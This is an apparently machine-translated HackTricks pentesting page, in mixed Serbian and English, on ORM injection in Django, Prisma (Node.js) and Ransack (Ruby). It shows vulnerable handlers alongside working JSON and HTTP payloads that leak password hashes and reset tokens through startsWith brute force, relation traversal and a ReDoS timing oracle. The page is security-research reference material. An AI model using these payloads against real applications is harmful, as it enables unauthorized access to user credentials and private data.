# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

U [**ovom postu**](https://www.elttam.com/blog/plormbing-your-django-orm/) obja코njeno je kako je mogu캖e u캜initi Django ORM ranjivim koriste캖i, na primer, kod kao 코to je:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Neki osnovni API prikaz na koji korisnici 코alju zahteve za
pretragu 캜lanaka
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Obratite pa쬹ju kako se svi request.data (koji 캖e biti json) direktno prosle캠uju da **filtriraju objekte iz baze podataka**. Napada캜 bi mogao poslati neo캜ekivane filtre kako bi iscurilo vi코e podataka nego 코to se o캜ekuje.

Primeri:

* **Prijava:** U jednostavnoj prijavi poku코ajte da iscurite lozinke korisnika registrovanih unutar nje.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Mogu캖e je izvr코iti brute-force napad na lozinku dok ne do캠e do curenja.
{% endhint %}

* **Relacijsko filtriranje**: Mogu캖e je pre캖i kroz relacije kako bi se do코lo do informacija iz kolona za koje se nije ni o캜ekivalo da 캖e biti kori코캖ene u operaciji. Na primer, ako je mogu캖e do캖i do 캜lanaka koje je kreirao korisnik sa ovim relacijama: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
Mogu캖e je prona캖i lozinku svih korisnika koji su kreirali 캜lanak
{% endhint %}

* **Filtriranje vi코e prema vi코e relacija**: U prethodnom primeru nismo mogli prona캖i lozinke korisnika koji nisu kreirali 캜lanak. Me캠utim, prate캖i druge relacije, to je mogu캖e. Na primer: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
U ovom slu캜aju mo쬰mo prona캖i sve korisnike u odeljenjima korisnika koji su kreirali 캜lanke i zatim otkriti njihove lozinke (u prethodnom json-u samo otkrivamo korisni캜ka imena, ali je mogu캖e otkriti i lozinke).
{% endhint %}

* **Zloupotreba Django Group i Permission mnogostrukih odnosa sa korisnicima**: 맚avi코e, AbstractUser model se koristi za generisanje korisnika u Django-u i po defaultu ovaj model ima neke **mnogostruke odnose sa Permission i Group tabelama**. 맚o je u su코tini podrazumevani na캜in da se **pristupi drugim korisnicima iz jednog korisnika** ako su u **isto혲 grupi ili dele istu dozvolu**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Zaobila쬰nje ograni캜enja filtera**: Isti blog post je predlo쬴o zaobila쬰nje kori코캖enja nekih filtera kao 코to je `articles = Article.objects.filter(is_secret=False, **request.data)`. Mogu캖e je izvu캖i 캜lanke koji imaju is\_secret=True jer mo쬰mo da se vratimo iz veze u tabelu Article i da otkrijemo tajne 캜lanke iz netajnih 캜lanaka jer su rezultati spojeni i is\_secret polje se proverava u netajnom 캜lanku dok se podaci otkrivaju iz tajnog 캜lanka.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
Zloupotreba odnosa mo쬰 omogu캖iti zaobila쬰nje 캜ak i filtera koji su namenjeni za코titi prikazanih podataka.
{% endhint %}

* **Gre코ka/Na osnovu vremena putem ReDoS**: U prethodnim primerima se o캜ekivalo da 캖e biti razli캜itih odgovora ako filtriranje funkcioni코e ili ne, kako bi se to koristilo kao orakl. Ali mo쬰 biti mogu캖e da se neka akcija izvr코i u bazi podataka i da je odgovor uvek isti. U ovom scenariju mo쬰 biti mogu캖e izazvati gre코ku u bazi podataka kako bi se dobio novi orakl.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
From te same post regarding this vector:

* **SQLite**: Ne poseduje regexp operator po defaultu (zahteva u캜itavanje tre캖e strane ekstenzije)
* **PostgreSQL**: Ne poseduje defaultni regex timeout i manje je podlo쬬n backtrackingu
* **MariaDB**: Ne poseduje regex timeout

## Prisma ORM (NodeJS)

The following are [**tricks extracted from this post**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Full find control**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// Napada캜 ima potpunu kontrolu nad svim prisma opcijama
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

It's possible to see that the whole javascript body is passed to prisma to perform queries.

In the example from the original post, this would check all the posts createdBy someone (each post is created by someone) returning also the user info of that someone (username, password...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
Slede캖i upit bira sve objave koje je kreirao neko sa lozinkom i vrati캖e lozinku:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Potpuna kontrola where klauzule**:

Pogledajmo ovo gde napad mo쬰 kontrolisati `where` klauzulu:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Podlo쬬n ORM leak-ovima
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Mogu캖e je filtrirati lozinku korisnika direktno kao:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
Kori코캖enjem operacija kao 코to je `startsWith` mogu캖e je otkriti informacije.&#x20;
{% endhint %}

* **Zaobila쬰nje filtriranja u mnogim-relacijama:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
Mogu캖e je otkriti neobjavljene 캜lanke vra캖anjem na mnoge-na-mnoge odnose izme캠u `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Tako캠e je mogu캖e leak-ovati sve korisnike zloupotrebom nekih loop back many-to-many odnosa:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Gre코ke/Upitnici sa vremenom**: U originalnom postu mo쬰te pro캜itati veoma opse쬬n skup testova koji su izvedeni kako bi se prona코ao optimalni payload za curenje informacija sa payload-om zasnovanim na vremenu. Ovo je:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Gde je `{CONTAINS_LIST}` lista sa 1000 stringova kako bi se osiguralo da **odgovor bude odlo쬰n kada se prona캠e ispravna leak.**

## **Ransack (Ruby)**

Ove trikove su [**prona코li u ovom postu**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Napomena da Ransack 4.0.0.0 sada zahteva kori코캖enje eksplicitne dozvoljene liste za pretra쬴ve atribute i asocijacije.**
{% endhint %}

**Vulnerable example:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Napomena kako 캖e upit biti definisan parametrima koje 코alje napada캜. Bilo je mogu캖e, na primer, izvr코iti brute-force napad na reset token sa:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
By brute-forcing and potentially relationships it was possible to leak more data from a database.

## References

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
